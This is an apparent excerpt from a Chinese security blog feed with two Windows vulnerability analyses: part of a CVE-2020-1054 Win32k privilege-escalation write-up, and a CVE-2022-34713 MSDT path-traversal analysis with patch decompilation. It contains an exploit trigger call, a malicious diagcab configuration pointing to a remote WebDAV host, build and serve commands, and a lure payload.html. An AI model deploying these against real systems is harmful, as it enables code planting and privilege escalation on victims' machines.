class="line-numbers language-none"><code class="language-none">for(i = 0; i&lt;prun-&gt;yPos; i++){    r14 = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0 + 4*(prun-&gt;xrl-&gt;xPos) + i*pSurf-&gt;lDelta}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>崩溃时的指令是<code>mov esi, [r14]</code>，由于引用无效的内存发生，是越界写入漏洞。崩溃时访问的地址能通过oob控制其中的内容。影响读写oobAddr的值有<code>prun-&gt;yPos</code>，<code>pSurf-&gt;lDelta</code>，<code>prun-&gt;xrl-&gt;xPos</code>和循环次数</p><pre class="line-numbers language-none"><code class="language-none">DrawIconEx(exploit_dc, 0x0, 0x0, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>yPos有DrawIconEx中的arg3和arg有关</p><pre class="line-numbers language-none"><code class="language-none">##include&lt;stdio.h&gt;int main(){    int arg3 = 0xb;    int arg6 = 0xffe00000;    int yPos = 0;    int remainder_count = 0;    int quotient_count = 0;    int mod_num = (arg3+1-(arg6+arg3+1)) % 0x20;    int div_num = (arg3+1-(arg6+arg3+1))/ 0x20;    if(0xf+mod_num&gt;=0x20){        remainder_count = mod_num;        quotient_count = div_num+1;        yPos = (remainder_count-1-1)*(div_num+1) \              + div_num +arg6 + arg3+1;    }else{        remainder_count = mod_num;        quotient_count = div_num;        yPos = (0x20-1-1)*div_num+arg6+arg3+1;    }    printf("arg3: 0x%x\n",arg3);    printf("arg6: 0x%x\n",arg6);    printf("yPos First: 0x%x\n",yPos);    printf("yPos Second: 0x%x\n",(yPos+quotient_count));    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>prun -&gt; xrl.xPos:0x900</p><p>pSurf-&gt;lDelta:0xa2a0</p><p>prun-&gt;xPos:0xb</p><h3 id="地址任意读写"><a href="#地址任意读写" class="headerlink" title="地址任意读写"></a>地址任意读写</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906100016677.png"></p><p>SIZEL sizlBitmap，是限定位图的长宽的，存储Pixel Data的长宽大小，四字节写可修改Pixel Data的大小</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
      <link href="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p><pre class="line-numbers language-none"><code class="language-none">Windows 11Server 2022Server, version 20H2Server 2019Windows 10Server 2016Server 2012 R2Server 2012Windows 8.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞，位于%WINDIR%\System32\msdt.exe,与以下文件类型相关联</p><table><thead><tr><th><strong>File type</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>.diagcab</td><td>Diagnostic cabinet file</td></tr><tr><td>.diagpkg</td><td>Diagnostic package file</td></tr><tr><td>.diagcfg</td><td>Diagnostic configuration file</td></tr></tbody></table><p>关注其中的diagcab文件。解开后拿到Custom.diagcfg:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008"&gt;  &lt;Execution&gt;    &lt;Package Path="\\webdav-test.herokuapp.com@ssl\DavWWWRoot\package" /&gt;    &lt;Name&gt;Some name&lt;/Name&gt;    &lt;Description&gt;Some description&lt;/Description&gt;    &lt;Icon&gt;@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001&lt;/Icon&gt;  &lt;/Execution&gt;  &lt;Index&gt;    &lt;Id&gt;Custom&lt;/Id&gt;    &lt;RequiresAdminPrivileges&gt;false&lt;/RequiresAdminPrivileges&gt;    &lt;PrivacyUrl&gt;http://go.microsoft.com/fwlink/?LinkId=190175&lt;/PrivacyUrl&gt;    &lt;Version&gt;1.0&lt;/Version&gt;    &lt;PublisherName&gt;Microsoft Corporation&lt;/PublisherName&gt;    &lt;Category&gt;@%windir%\system32\DiagCpl.dll,-412&lt;/Category&gt;    &lt;Keyword&gt;@%windir%\system32\DiagCpl.dll,-27&lt;/Keyword&gt;  &lt;/Index&gt;&lt;/PackageConfiguration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>&lt;Execution&gt;</code>标签下说明了该诊断包的执行行为, msdt会访问<code>&lt;Package Path&gt;</code>给出的路径。</p><p>漏洞位于<code>sdiageng.dll</code>中，该库从diagcab的XML文件中获取攻击者提供的文件夹路径，当包获取完成后, msdt将对其进行签名检查, 它将包的副本复制到<code>%TEMP%\SDIAG_&lt;UUID&gt;</code>的临时目录, 调用函数<code>sdiageng!SdpCopyDirectory</code>。在此过程中枚举攻击者文件夹中的文件，获取每个文件的文件名，然后将本地临时文件路径和该文件名拼接用来创建文件在计算机上的本地路径。</p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>设置一个托管恶意.diagcab文件的webdav服务器，当访问.diagcab文件的链接或者下载时，会将执行路径穿越，把可执行程序写入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup,每次启动自动执行。</p><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、创建webdav服务器</p><p>实现运行webdav服务的脚本或程序, 部署在服务端。注册并部署客户端访问的package路径。</p><p>2、构造<code>diagcfg</code>文件</p><p>测试用的<code>diagcfg</code>中的package:</p><pre class="line-numbers language-none"><code class="language-none">&lt;Package Path="\\127.0.0.1\DavWWWRoot\package" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、构造辅助利用文件: <code>diagcab</code>或<code>docx</code>文档</p><p>4、投递用户, 打开构造后的文件</p><p> 注: 目标环境需要开启webclient服务, 否则无法访问webdav的UNC路径。</p><h4 id="利用的文件类型-diagcab"><a href="#利用的文件类型-diagcab" class="headerlink" title="利用的文件类型: diagcab"></a>利用的文件类型: <code>diagcab</code></h4><p>将<code>diagcfg</code>打包为<code>diagcab</code>, 双击打开后漏洞利用完成:</p><p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155250555.png"></p><p>该漏洞只能做到载荷投放, 需要通过其他方式才可运行。</p><p>使用docker</p><p>1.构建Custom.diagcfg</p><pre class="line-numbers language-none"><code class="language-none">./build-malicious-diagcfg.sh --url [WEBDAV_URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.构建hotfix895214.diagcab,移至./webdav/diagcab-webdav-poc/config目录,将可执行文件放入./webdav/malicious</p><pre class="line-numbers language-none"><code class="language-none">cabarc.exe n hotfix895214.diagcab Custom.diagcfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.启动服务</p><pre class="line-numbers language-none"><code class="language-none">cd ./webdav/diagcab-webdav-pocperl diagcab-webdav-poc.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者直接使用docker直接执行<code>./hurry-dogwalk.sh [WEBDAV_URL]</code></p><p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155349317.png"></p><h4 id="利用的文件类型-docx"><a href="#利用的文件类型-docx" class="headerlink" title="利用的文件类型: docx"></a>利用的文件类型: docx</h4><p>解开.docx样本文件，关注其中/word/_rels目录下的document.xml.rels文件。会对外部文件进行引用执行。</p><pre class="line-numbers language-none"><code class="language-none">Target="https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html!x-usc:https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html" TargetMode = "External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload.html</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token operator">...</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"search-ms:query=i-repair-everything-on-your-computer.diagcab&amp;crumb=location:%5C%5Cwebdav-test.herokuapp.com%40SSL%5CDavWWWRoot%5Cconfig&amp;displayname=Important%20update"</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行payload访问webdav</p><h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><h3 id="sdiageng-SdpCopyDirectory"><a href="#sdiageng-SdpCopyDirectory" class="headerlink" title="sdiageng!SdpCopyDirectory"></a>sdiageng!SdpCopyDirectory</h3><p>位于<code>sdiageng!SdpCopyDirectory</code> (19044.1899):</p><p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155426628.png"></p><p>添加了检查目录的逻辑。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpCopyDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aPckSource<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aTmpSDiagPath<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lsTmpSDiagPath<span class="token punctuation">;</span> <span class="token comment">// r13</span>  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lPckSource<span class="token punctuation">;</span> <span class="token comment">// r12</span>  <span class="token keyword">char</span> bFlagTurnOffCheck<span class="token punctuation">;</span> <span class="token comment">// di</span>  LSTATUS lRes1<span class="token punctuation">;</span> <span class="token comment">// eax</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">unsigned</span> __int64 lRes2<span class="token punctuation">;</span> <span class="token comment">// r9</span>  <span class="token keyword">char</span> <span class="token operator">*</span>hFind<span class="token punctuation">;</span> <span class="token comment">// r15</span>  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// er9</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  LSTATUS dwRet1<span class="token punctuation">;</span> <span class="token comment">// eax</span>  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwRet2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sWebDavFile<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sTmpSDiagFile<span class="token punctuation">;</span> <span class="token comment">// r14</span>  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError6<span class="token punctuation">;</span> <span class="token comment">// eax</span>  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// r8</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// eax</span>  BYTE Data<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h]</span>  DWORD cbData<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-CCh]</span>  DWORD Type<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-C8h]</span>  HKEY hKey<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-C0h]</span>  <span class="token keyword">struct</span> <span class="token class-name">_WIN32_FIND_DATAW</span> FindFileData<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-B0h]</span>  wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3 <span class="token operator">*</span>retaddr<span class="token punctuation">;</span> <span class="token comment">// [rsp+2E8h] [rbp+1E8h]</span>  lsTmpSDiagPath <span class="token operator">=</span> aTmpSDiagPath<span class="token punctuation">;</span>  lPckSource <span class="token operator">=</span> aPckSource<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_7FFC50EF27F8 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    bFlagTurnOffCheck <span class="token operator">=</span> byte_7FFC50EF2858<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  hKey <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>                                  <span class="token comment">// TurnOffCheck Registry key turned on</span>  lRes1 <span class="token operator">=</span> <span class="token function">RegOpenKeyExW</span><span class="token punctuation">(</span>            HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>            L<span class="token string">"Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics"</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0x20019u</span><span class="token punctuation">,</span>            <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  lRes2 <span class="token operator">=</span> lRes1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> lRes1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    lRes2 <span class="token operator">=</span> lRes1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>lRes2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>i64 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7EA</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> lRes2<span class="token punctuation">)</span><span class="token punctuation">;</span>TURNOFFCHECK_OFF<span class="token operator">:</span>    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hKey <span class="token punctuation">)</span>    <span class="token keyword">goto</span> TURNOFFCHECK_OFF<span class="token punctuation">;</span>  <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  Type <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  cbData <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  dwRet1 <span class="token operator">=</span> <span class="token function">RegQueryValueExW</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> L<span class="token string">"TurnOffCheck"</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Type<span class="token punctuation">,</span> Data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span>  dwRet2 <span class="token operator">=</span> dwRet1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>    dwRet2 <span class="token operator">=</span> dwRet1<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7FB</span><span class="token punctuation">,</span> v13<span class="token punctuation">,</span> dwRet2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> hKey <span class="token punctuation">)</span>    <span class="token function">RegCloseKey</span><span class="token punctuation">(</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token operator">*</span>Data<span class="token punctuation">)</span> <span class="token punctuation">)</span>    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  byte_7FFC50EF2858 <span class="token operator">=</span> bFlagTurnOffCheck<span class="token punctuation">;</span>  byte_7FFC50EF27F8 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>DEBUG_TRACE1<span class="token operator">:</span>  hFind <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lPckSource <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>  <span class="token punctuation">{</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">2103</span>i64<span class="token punctuation">;</span>DEBUG_TRACE2<span class="token operator">:</span>    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>DEBUG_TRACE3<span class="token operator">:</span>    dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> dwLastError5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lsTmpSDiagPath <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">2104</span>i64<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  sWebDavFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sWebDavFile <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>    itraceCode1 <span class="token operator">=</span> <span class="token number">2107</span>i64<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE3<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  sTmpSDiagFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sTmpSDiagFile <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    dwLastError3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>    itraceCode2 <span class="token operator">=</span> <span class="token number">2110</span>i64<span class="token punctuation">;</span>    dwLastError2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\*"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">)</span><span class="token punctuation">;</span>  dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    itraceCode2 <span class="token operator">=</span> <span class="token number">2113</span>i64<span class="token punctuation">;</span>    <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  hFind <span class="token operator">=</span> <span class="token function">FindFirstFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Search for file or directory in WebDavRoot\*</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">do</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>dwFileAttributes <span class="token operator">&amp;</span> FILE_ATTRIBUTE_DIRECTORY<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Isn't it a directory? Setup sWebDavFile and sTmpSDiagFile</span>      <span class="token punctuation">{</span>        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          itraceCode2 <span class="token operator">=</span> <span class="token number">2134</span>i64<span class="token punctuation">;</span>DEBUG_TRACE4<span class="token operator">:</span>          dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>DEBUG_TRACE5<span class="token operator">:</span>          <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lsTmpSDiagPath<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          itraceCode2 <span class="token operator">=</span> <span class="token number">0x85D</span>i64<span class="token punctuation">;</span>          <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> bFlagTurnOffCheck <span class="token punctuation">)</span>                <span class="token comment">// Is TurnOffCheck turned off?</span>        <span class="token punctuation">{</span>          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lPckSource<span class="token punctuation">,</span> sWebDavFile<span class="token punctuation">,</span> Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any WebDav file is sub-directory of package source </span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>            <span class="token keyword">goto</span> REPORT_FAILURE<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lsTmpSDiagPath<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> Data<span class="token 